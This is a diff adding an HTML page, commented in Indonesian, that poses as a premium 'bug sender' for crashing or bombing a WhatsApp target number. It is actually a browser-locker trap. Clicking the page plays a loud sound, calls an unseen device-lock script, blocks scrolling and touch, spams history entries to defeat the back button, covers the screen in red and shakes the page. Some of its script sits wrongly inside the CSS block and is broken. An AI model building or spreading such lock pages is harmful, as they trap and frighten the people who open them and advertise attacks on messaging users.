@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DEVICE LOCK😈</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* Block semua interaksi keluar */
+        body {
+            overflow: hidden;
+            user-select: none;
+            -webkit-user-select: none;
+            margin: 0;
+            background: #000;
+        }
+        .fullscreen-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('1000387313.jpg') no-repeat center center fixed;
+            background-size: cover;
+            cursor: pointer;
+        }
+        .content {
+            position: relative;
+            z-index: 2;
+            color: white;
+            text-align: center;
+            padding-top: 50px;
+        }
+        /* Disable back button & context menu */
+        body.oncontextmenu = function() { return false; }
+        document.onkeydown = function(e) {
+            if (e.key === 'Backspace' || e.key === 'Escape' || e.key === 'F5') {
+                e.preventDefault();
+                return false;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Gambar background fullscreen -->
+    <div class="fullscreen-bg" id="trigger"></div>
+
+    <!-- Konten utama -->
+    <div class="container content">
+        <!-- Header -->
+        <div class="header">
+            <div class="logo">
+                <i class="fas fa-bug"></i>
+                <span>ZixxV1</span>
+            </div>
+            <div class="badge premium">"PREMIUM"</div>
+        </div>
+
+        <!-- Info User -->
+        <div class="user-info">
+            <p><i class="fas fa-user-shield"></i> Role: <strong>OWNER</strong> • Exp: <strong>30d</strong></p>
+        </div>
+
+        <!-- Form Input -->
+        <div class="form-group">
+            <label for="target"><i class="fas fa-mobile-alt"></i> TARGET NUMBER</label>
+            <input type="text" id="target" placeholder="e.g. 628xxxxxxxxxxx" readonly>
+        </div>
+
+        <div class="form-group">
+            <label for="bug-select"><i class="fas fa-code-branch"></i> SELECT BUG</label>
+            <select id="bug-select" disabled>
+                <option disabled selected>Select Bug...</option>
+                <option>WhatsApp Crash v9</option>
+                <option>Message Bomb 999+</option>
+                <option>System Virus Inject</option>
+                <option>Device Freeze 60s</option>
+                <option>DEVICE LOCK😈</option>
+                <option>404 HACKED</option>
+                <option>VIRUS RANSOMWARE</option>
+            </select>
+        </div>
+
+        <!-- Tombol Aksi -->
+        <button id="send-btn" class="btn-send" disabled>
+            <i class="fas fa-paper-plane"></i> SEND BUG
+        </button>
+
+        <!-- Footer -->
+        <div class="footer">
+            <p>©Inisial "O"</p>
+            <div class="bug-list">
+                <span class="bug-tag">DEVICE LOCK😈</span>
+                <span class="bug-tag">404 HACKED</span>
+                <span class="bug-tag">VIRUS RANSOMWARE</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Sound Effect -->
+    <audio id="boom-sound" preload="auto">
+        <source src="https://assets.mixkit.co/sfx/preview/mixkit-bomb-explosion-2800.mp3" type="audio/mpeg">
+    </audio>
+
+    <!-- Scripts -->
+    <script src="lock-script.js"></script>
+    <script>
+        // Trigger saat gambar diklik
+        document.getElementById('trigger').addEventListener('click', function() {
+            // Play sound
+            const sound = document.getElementById('boom-sound');
+            sound.volume = 1.0;
+            sound.play();
+            
+            // Execute device lock script
+            executeDeviceLock();
+            
+            // Halaman mulai freeze
+            startFreeze();
+        });
+
+        function startFreeze() {
+            // Block semua event
+            document.addEventListener('touchmove', function(e) { e.preventDefault(); }, { passive: false });
+            document.addEventListener('mousewheel', function(e) { e.preventDefault(); }, { passive: false });
+            
+            // Redirect terus menerus
+            setInterval(() => {
+                window.history.pushState({}, '', '#locked');
+            }, 50);
+            
+            // Overlay merah
+            const overlay = document.createElement('div');
+            overlay.style.position = 'fixed';
+            overlay.style.top = '0';
+            overlay.style.left = '0';
+            overlay.style.width = '100%';
+            overlay.style.height = '100%';
+            overlay.style.background = 'rgba(255, 0, 0, 0.3)';
+            overlay.style.zIndex = '9999';
+            overlay.style.pointerEvents = 'none';
+            document.body.appendChild(overlay);
+            
+            // Crash effect
+            setInterval(() => {
+                document.body.style.transform = `translate(${Math.random()*10}px, ${Math.random()*10}px)`;
+            }, 100);
+        }
+    </script>
+</body>
+</html>
